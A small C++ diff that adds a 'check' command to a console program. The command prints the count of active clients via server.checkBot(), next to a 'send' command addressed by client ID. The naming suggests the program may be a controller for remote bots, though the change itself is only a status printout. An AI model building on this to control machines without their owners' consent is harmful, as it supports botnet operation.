@@ -98,6 +98,9 @@ int32_t main(int32_t argc, char **argv) {
                 std::cout << "_______________" << std::endl
                           << CID.data()        << std::endl;
 
+        if (sh == "check")
+            std::cout << "Active clients: " << server.checkBot() << std::endl;
+
         if (sh == "send") {
             uint32_t CID = 0;
 
